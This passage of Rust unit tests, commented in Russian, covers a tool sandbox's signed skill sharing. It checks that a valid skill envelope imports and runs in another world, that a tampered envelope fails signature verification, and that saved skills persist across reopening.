        let env = a.call(CapLevel::Read, "skill_share", &args_of(r#"{"name":"ритуал"}"#)).text;

        // чужой мир: импорт валидного конверта
        let mut b = tmp_world("shareB");
        let out = b.call(CapLevel::Write, "skill_import", &args_of(&format!(r#"{{"skill":"{}"}}"#, env.replace('\\', "\\\\").replace('"', "\\\""))));
        // строковый конверт тоже принимается
        assert!(out.text.contains("импортирован"), "{}", out.text);
        let out = b.call(CapLevel::Destructive, "skill_run", &args_of(r#"{"name":"ритуал"}"#));
        assert!(!out.is_error, "{}", out.text);
        assert_eq!(b.call(CapLevel::Read, "fs_read", &args_of(r#"{"path":"x.txt"}"#)).text, "1");

        // подделанный конверт бракуется (имя изменено → подпись не бьётся)
        let evil = env.replace("ритуал", "ритуалX");
        let out = b.call(
            CapLevel::Write,
            "skill_import",
            &args_of(&format!(r#"{{"skill":{}}}"#, crate::json::Json::Str(evil.clone()).to_string())),
        );
        assert!(out.is_error, "подделка не импортируется: {}", out.text);
        assert!(out.text.contains("подпись"), "{}", out.text);
    }

    #[test]
    fn skills_survive_reopen() {
        let dir = std::env::temp_dir().join(format!("dinet-skillpersist-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        {
            let mut w = ToolWorld::open(&dir, vec![AllowRule::new("echo")]).expect("мир");
            w.call(
                CapLevel::Write,
                "skill_save",
                &args_of(r#"{"name":"живучий","steps":[{"tool":"fs_list","args":{}}]}"#),
            );
        }
        let w2 = ToolWorld::open(&dir, vec![AllowRule::new("echo")]).expect("реopen");
        let sk = w2.skills.get("живучий").expect("навык пережил рестарт");
        assert_eq!(sk.version, 1);
        assert!(sk.verify(), "подпись жива");
        let mut w3 = ToolWorld::open(&dir, vec![AllowRule::new("echo")]).expect("reopen2");
        let out = w3.call(CapLevel::Read, "skill_list", &args_of("{}"));
        assert!(out.text.contains("живучий"), "{}", out.text);
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn now_secs() -> u64 {
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0)
    }
}
